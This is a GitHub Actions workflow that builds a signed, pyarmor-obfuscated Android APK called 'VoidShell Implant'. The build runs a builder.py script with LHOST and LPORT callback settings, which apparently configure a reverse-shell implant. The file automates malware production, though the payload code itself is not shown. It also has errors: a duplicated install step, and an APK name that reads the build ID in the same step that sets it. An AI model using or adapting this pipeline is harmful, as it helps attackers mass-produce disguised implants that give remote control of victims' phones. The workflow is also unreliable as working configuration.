# .github/workflows/build-voidshell.yml
name: Build VoidShell Implant

on:                     # triggers 
  workflow_dispatch:                   # allows manual run from GitHub UI

jobs:
  build-apk:
    runs-on: ubuntu-latest
    environment: production             # put secrets here (optional)
    permissions:
      contents: write                  # needed to create releases

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python 3.12
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyaxmlparser androguard requests pyarmor

      - name: Generate unique build ID & timestamp
        id: vars
        run: |
          echo "build_id=$(date +%Y%m%d-%H%M%S)-$(openssl rand -hex 3)" >> $GITHUB_OUTPUT
          echo "apk_name=VoidShell-${{ steps.vars.outputs.build_id }}.apk" >> $GITHUB_OUTPUT

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyaxmlparser androguard requests
      
      - name: Install APK signing tools (zipalign + apksigner)
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y zipalign apksigner openjdk-11-jdk
      - name: Build signed APK (using your builder script)
        run: |
          # If you don't use secrets, hardcode or use defaults
          python builder.py \
            --lhost "${LHOST:-127.0.0.1}" \
            --lport "${LPORT:-4433}" \
            --output "dist/${{ steps.vars.outputs.apk_name }}"

      
